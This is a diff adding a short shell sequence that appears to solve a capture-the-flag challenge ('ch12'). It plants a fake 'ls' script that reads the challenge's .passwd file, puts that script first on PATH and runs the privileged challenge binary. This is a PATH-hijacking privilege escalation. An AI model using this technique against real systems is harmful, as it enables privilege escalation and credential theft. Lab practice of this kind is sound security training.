@@ -1,0 +1,13 @@
+cd /tmp
+mkdir caca
+cd caca
+nano ls
+{
+#!/bin/bash
+/bin/cat /challenge/app-script/ch12/.passwd
+}
+chmod +x ls
+export PATH=$(pwd):$PATH
+/challenge/app-script/ch12/ch12
+
+
